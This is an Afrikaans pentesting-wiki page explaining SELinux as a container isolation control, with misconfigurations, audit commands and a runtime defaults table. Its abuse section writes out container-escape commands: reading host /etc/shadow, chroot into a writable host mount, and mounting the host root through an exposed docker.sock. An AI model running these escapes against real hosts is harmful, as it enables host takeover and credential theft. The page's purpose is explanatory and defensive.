# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

SELinux is ’n **label-gebaseerde Mandatory Access Control**-stelsel. Elke relevante proses en objek kan ’n security context dra, en policy bepaal watter domains met watter types mag interaksie hê en op watter manier. In containerized omgewings beteken dit gewoonlik dat die runtime die container-proses binne ’n beperkte container-domain begin en die container-inhoud met ooreenstemmende types label. As die policy behoorlik werk, kan die proses moontlik die dinge lees en skryf waaraan sy label na verwagting mag raak, terwyl toegang tot ander host-inhoud geweier word, selfs al word daardie inhoud deur ’n mount sigbaar.

Dit is een van die kragtigste host-side protections wat in mainstream Linux-container deployments beskikbaar is. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift en ander SELinux-gesentreerde ecosystems. In daardie omgewings sal ’n reviewer wat SELinux ignoreer, dikwels verkeerd verstaan waarom ’n oënskynlik voor die hand liggende pad na host compromise eintlik geblokkeer word.

## AppArmor Vs SELinux

Die maklikste hoëvlakverskil is dat AppArmor path-based is, terwyl SELinux **label-based** is. Dit het groot gevolge vir container security. ’n Path-based policy kan anders optree as dieselfde host-inhoud onder ’n onverwagte mount path sigbaar word. ’n Label-based policy vra eerder wat die objek se label is en wat die proses-domain daarmee mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit wel robuust teen ’n klas path-trick-aannames wat defenders soms per ongeluk in AppArmor-gebaseerde systems maak.

Omdat die model label-georiënteerd is, is container volume-handling en relabeling-besluite security-critical. As die runtime of operator labels te wyd verander om "mounts te laat werk", kan die policy boundary wat veronderstel was om die workload te bevat, baie swakker word as wat bedoel is.

## Lab

Om te sien of SELinux aktief op die host is:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande labels op die host te inspekteer:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om 'n normale uitvoering te vergelyk met een waar labeling gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op ’n SELinux-enabled host is dit ’n baie praktiese demonstrasie omdat dit die verskil toon tussen ’n workload wat onder die verwagte container domain loop en een waarvan daardie enforcement layer verwyder is.

## Gebruik tydens runtime

Podman is besonder goed met SELinux geïntegreer op stelsels waar SELinux deel van die platform se verstek is. Rootless Podman plus SELinux is een van die sterkste mainstream container-baselines omdat die proses reeds aan die host-kant onbevoorreg is en steeds deur MAC policy ingeperk word. Docker kan SELinux ook gebruik waar dit ondersteun word, hoewel administrateurs dit soms deaktiveer om probleme met volume-labeling te omseil. CRI-O en OpenShift steun sterk op SELinux as deel van hul container-isolation-verhaal. Kubernetes kan SELinux-verwante settings ook blootstel, maar die waarde daarvan hang natuurlik daarvan af of die node OS SELinux werklik ondersteun en afdwing.<sup>[[2]](#references)</sup>

Die herhalende les is dat SELinux nie ’n opsionele versiering is nie. In die ecosystems wat daaromheen gebou is, is dit deel van die verwagte security boundary.

## Wanopstellings

Die klassieke fout is `label=disable`. Operasioneel gebeur dit dikwels omdat ’n volume mount geweier is en die vinnigste korttermynantwoord was om SELinux uit die vergelyking te verwyder eerder as om die labeling-model reg te stel.<sup>[[1]](#references)</sup> Nog ’n algemene fout is verkeerde relabeling van host-inhoud. Breë relabel-operasies kan die application laat werk, maar dit kan ook uitbrei wat die container mag aanraak tot ver buite wat oorspronklik bedoel is.

Dit is ook belangrik om nie **installed** SELinux met **effective** SELinux te verwar nie. ’n Host kan SELinux ondersteun en steeds in permissive mode wees, of die runtime lanseer dalk nie die workload onder die verwagte domain nie. In hierdie gevalle is die protection baie swakker as wat die documentation moontlik suggereer.

## Misbruik

Wanneer SELinux afwesig, permissive of breedweg vir die workload gedeaktiveer is, word host-mounted paths baie makliker om te misbruik. Dieselfde bind mount wat andersins deur labels beperk sou word, kan ’n direkte weg na host-data of host-modification word. Dit is veral relevant wanneer dit gekombineer word met writable volume mounts, container runtime directories of operasionele kortpaaie wat sensitiewe host paths vir gerief blootgestel het.

SELinux verduidelik dikwels waarom ’n generiese breakout writeup onmiddellik op een host werk, maar herhaaldelik op ’n ander misluk, selfs al lyk die runtime flags dieselfde. Die ontbrekende bestanddeel is dikwels nie ’n namespace of ’n capability nie, maar ’n label boundary wat behoue gebly het.

Die vinnigste praktiese check is om die aktiewe context te vergelyk en dan mounted host paths of runtime directories te toets wat normaalweg deur labels beperk sou word:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
As ’n host bind mount teenwoordig is en SELinux labeling gedeaktiveer of verswak is, kom inligtingsopenbaarmaking dikwels eerste:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
As die mount skryfbaar is en die container vanuit die kernel se oogpunt effektief host-root is, is die volgende stap om beheerde host-wysiging te toets eerder as om te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op SELinux-ondersteunende gashere kan die verlies van labels rondom runtime state-gidse ook direkte privilege-escalation-paaie blootlê:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie commands vervang nie ’n volledige escape chain nie, maar hulle maak dit baie vinnig duidelik of SELinux die rede was waarom toegang tot host-data of wysiging van lêers aan die host-kant verhoed is.

### Volledige voorbeeld: SELinux gedeaktiveer + skryfbare host-mount

As SELinux-labeling gedeaktiveer is en die host-lêerstelsel skryfbaar by `/host` gemount is, word ’n volledige host escape ’n normale bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As die `chroot` suksesvol is, werk die houerproses nou vanaf die gasheer se lêerstelsel:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige voorbeeld: SELinux gedeaktiveer + Runtime-gids

As die workload ’n runtime socket kan bereik sodra labels gedeaktiveer is, kan die escape aan die runtime gedelegeer word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die beheermeganisme was wat presies hierdie soort toegang tot host-paaie of runtime-toestand verhoed het.

## Kontroles

Die doel van die SELinux-kontroles is om te bevestig dat SELinux geaktiveer is, die huidige sekuriteitskonteks te identifiseer, en te bepaal of die lêers of paaie waarin jy belangstel, werklik deur labels beperk word.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Wat hier interessant is:

- `getenforce` behoort ideaalweg `Enforcing` terug te gee; `Permissive` of `Disabled` verander die betekenis van die hele SELinux-afdeling.
- As die huidige proses-konteks onverwags of te wyd lyk, loop die workload moontlik nie onder die bedoelde container policy nie.
- As host-gemonteerde lêers of runtime-gidse labels het waartoe die proses te vrylik toegang het, word bind mounts baie gevaarliker.

Wanneer ’n container op ’n SELinux-bekwame platform nagegaan word, moenie labeling as ’n sekondêre detail beskou nie. In baie gevalle is dit een van die hoofredes waarom die host nog nie reeds compromised is nie.

## Runtime-verstekke

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Host-afhanklik | SELinux-separation is beskikbaar op SELinux-geaktiveerde hosts, maar die presiese gedrag hang van die host/daemon-konfigurasie af | `--security-opt label=disable`, breë relabeling van bind mounts, `--privileged` |
| Podman | Gewoonlik enabled op SELinux-hosts | SELinux-separation is ’n normale deel van Podman op SELinux-stelsels, tensy dit disabled is | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Nie algemeen outomaties op Pod-vlak toegeken nie | SELinux-ondersteuning bestaan, maar Pods benodig gewoonlik `securityContext.seLinuxOptions` of platformspesifieke verstekke; runtime- en node-ondersteuning word vereis | swak of breë `seLinuxOptions`, loop op permissive/disabled nodes, platform policies wat labeling disable |
| CRI-O / OpenShift-styl deployments | Daar word gewoonlik sterk daarop gesteun | SELinux is dikwels ’n kernonderdeel van die node-isolasiemodel in hierdie omgewings | custom policies wat toegang te wyd maak, disabling van labeling vir compatibility |

SELinux-verstekke is meer distribution-afhanklik as seccomp-verstekke. Op Fedora/RHEL/OpenShift-styl-stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.

## Verwysings

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
